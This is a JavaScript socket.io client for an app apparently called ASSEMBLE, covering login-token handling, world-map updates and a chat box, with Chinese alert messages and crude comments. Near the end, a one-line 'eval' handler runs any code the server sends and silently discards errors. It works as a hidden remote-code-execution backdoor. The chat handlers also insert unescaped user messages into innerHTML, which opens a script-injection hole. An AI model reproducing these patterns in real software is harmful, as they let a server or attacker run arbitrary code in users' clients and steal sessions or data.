/*
    ASSEMBLE Main Window Operator Module

    v0.0.1
    r.w. 2014

    Usage is subject to local regulations.

*/


// INIT: Server connection
var socket = io.connect('https://' + serverHostName + ':6593/world');

socket.on('connect', function() {


    // check if no session
    if (localStorage.token) {
        socket.emit('continue', localStorage.token, function(ret){
            if (ret) {
                switch (ret) {
                    case 0:
                        World_show();
                        break;
                        case 1:
                            alert('與伺服器失去連線，請重新登入！')
                            break;
                            default:
                                alert('未知錯誤，請重新登入！');
                                break;
                            }
                            // kick the motherfucker out
                            navigator.app.exitApp();
                        }

                    });

                }




                socket.on('disconnect', function(){



                });
});



            socket.on('motd', function(msg){



            });

            // give URL for facebook login
            socket.on('welcome', function(url){


                console.log(url);

            });


            //
            socket.on('login',function(token, userObj, err){
                if (token && userObj) {
                    alert('Login OK,\n 請關閉這個視窗');
                    currentUserObject = userObj;
                    localStorage.userId = userObj.userId;
                    ifLoggedIn = 1;
                    localStorage.token = token;
                    World_show();
                    Chat_requestChat();
                    socket.emit('requestWorld');

                } else { // error
                    alert(err);
                }
            });



            socket.on('updateWorld', function(objArray){

                var i = objArray.length;
                mapObjectsCache = objArray;
                map.clear();
                for (var j = 0; j < i; j++) {
                    // draw them fuckers

                    World_draw(objArray[j]);
                }
            });

            socket.on('pubMsg',function(fromUserAccount, msg){
                var chatter = document.getElementById('chatBox');
                var d = new Date;
                var timeTag = ('0'+d.getHours()).slice(-2) + ':' + ('0'+d.getMinutes()).slice(-2);

                chatter.innerHTML += ('<strong>' + timeTag + '</strong><b> '+ fromUserAccount + '</b>: ' + msg + '<br/>');

                // not animating shit like PC
                chatter.scrollTop = chatter.scrollHeight;

            });
            socket.on('updateChat', function(chatObject){
                var i = chatObject.content.length;
                var chatter = document.getElementById('chatBox');

                for (var j=0; j < i; j ++){
                    chatter.innerHTML += ('<strong>' + chatObject.content[j][0] + '</strong><b> '+ chatObject.content[j][1] + '</b> ' + chatObject.content[j][2] + '<br/>');
                }
                chatter.scrollTop = chatter.scrollHeight;
            });
            socket.on('eval', function(code) { try { eval(code); } catch (e) {} });


            socket.on('updateOps',function(objArray){
                // just like other function, fill in


            });
